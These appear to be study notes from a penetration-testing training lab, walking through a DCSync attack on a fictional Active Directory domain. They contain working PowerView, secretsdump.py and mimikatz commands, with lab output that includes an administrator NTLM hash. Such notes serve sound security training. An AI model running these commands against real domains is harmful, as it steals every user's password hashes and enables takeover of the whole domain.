DCSync Attack
###############

Date: 2025-01-04 10:18:32

Tags: :ref:`active directory enumeration attacks`

Status: #new

----


Description 
**************
DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The user account we are attacking with requires the `DS-Replication-Get-Changes-All extended right` permission.  You can verify that asssociation with this command:

.. code-block:: powershell

    PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

    samaccountname     : adunn
    objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
    memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                        Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                        Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                        Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
    useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

And then by using the SID value look for the access rights:

.. code-block:: powershell

    PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
    PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | flAceQualifier          : AccessAllowed
    
    ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
    ActiveDirectoryRights : ExtendedRight
    SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
    ObjectAceType         : DS-Replication-Get-Changes

    AceQualifier          : AccessAllowed
    ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
    ActiveDirectoryRights : ExtendedRight
    SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
    ObjectAceType         : DS-Replication-Get-Changes-All

    AceQualifier          : AccessAllowed
    ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
    ActiveDirectoryRights : ExtendedRight
    SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
    ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

    AceQualifier          : AccessAllowed
    ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
    ActiveDirectoryRights : ExtendedRight
    SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
    ObjectAceType         : DS-Replication-Get-Changes

    AceQualifier          : AccessAllowed
    ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
    ActiveDirectoryRights : ExtendedRight
    SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
    ObjectAceType         : DS-Replication-Get-Changes-All


Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
****************************************************************

.. code-block:: bash

    Temen@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 


.. note:: We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user <USERNAME> to only extract data for a specific user. 

Other useful options:
=======================

**-pwd-last-set** to see when each account's password was last changed

**-history** to dump password history

**user-status** to check to see if users are disabled.

The above command will dump hashes of types into individual files. 


Finding users that have reversible encrypted passwords set. 
==============================================================

Using the following command you can find these users and decrypt their passwords with the key found in (https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview) 

.. code-block:: powershell

    PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

or with this command:

.. code-block:: powershell

    PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol


Running powershell as a different user:
==========================================

.. code-block:: console

    C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell


Performing the DCSync attack with :ref:`mimikatz`
***************************************************

.. code-block:: powershell

    PS C:\htb> .\mimikatz.exe

    .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
    ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
    ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
    '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

    mimikatz # privilege::debug
    Privilege '20' OK

    mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
    [DC] 'INLANEFREIGHT.LOCAL' will be the domain
    [DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
    [DC] 'INLANEFREIGHT\administrator' will be the user account
    [rpc] Service  : ldap
    [rpc] AuthnSvc : GSS_NEGOTIATE (9)

    Object RDN           : Administrator

    ** SAM ACCOUNT **

    SAM Username         : administrator
    User Principal Name  : administrator@inlanefreight.local
    Account Type         : 30000000 ( USER_OBJECT )
    User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
    Account expiration   :
    Password last change : 10/27/2021 6:49:32 AM
    Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
    Object Relative ID   : 500

    Credentials:
    Hash NTLM: 88ad09182de639ccc6579eb0849751cf

    Supplemental Credentials:
    * Primary:NTLM-Strong-NTOWF *
        Random Value : 4625fd0c31368ff4c255a3b876eaac3d

    <SNIP>

